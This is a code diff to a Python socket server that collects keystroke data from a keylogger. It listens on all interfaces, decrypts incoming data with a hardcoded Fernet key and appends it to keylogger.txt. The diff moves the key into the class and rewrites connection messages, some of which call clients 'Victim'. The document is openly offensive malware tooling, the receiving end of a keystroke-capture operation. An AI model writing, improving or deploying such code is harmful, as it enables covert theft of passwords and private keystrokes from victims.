@@ -8,10 +8,11 @@ from cryptography.fernet import Fernet, InvalidToken
 
 class Server():
 
-   def __init__(self, Host, Port):
+   def __init__(self, Host, Port, crypt_key):
     
      self.__Host = Host
      self.__Port = Port
+     self.__crypt = Fernet(crypt_key)
 
    def handle_client(self, conn, addr):
 
@@ -24,13 +25,13 @@ class Server():
 
                if not data:
 
-                  print(f"Client {addr[0]} has disconnected")
+                  print(f"Victim {addr[0]} has disconnected")
                   break 
 
                try: 
                      # decode_msg = data.decode('utf-8')
                      print(f'Raw data: {data}')
-                     decode_msg = crypt.decrypt(data).decode('utf-8')
+                     decode_msg = self.__crypt.decrypt(data).decode('utf-8')
                      print(f"{decode_msg}", end='')
 
                      with open("keylogger.txt", 'a') as f:
@@ -44,7 +45,7 @@ class Server():
 
       except ConnectionResetError:
 
-         print(f"The victim has disconnected")
+         print(f"{addr[0]} has disconnected")
 
       finally:
 
@@ -78,6 +79,7 @@ class Server():
             s.close()
             print("Socket has been closed.")
             sys.exit(0)
+
 if __name__ == '__main__':
   
    Host = "0.0.0.0"
@@ -86,9 +88,8 @@ if __name__ == '__main__':
    # load the key
 
    KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
-   crypt = Fernet(KEY)
 
-   server = Server(Host, Port)
+   server = Server(Host, Port, KEY)
 
    server.start_server()
   
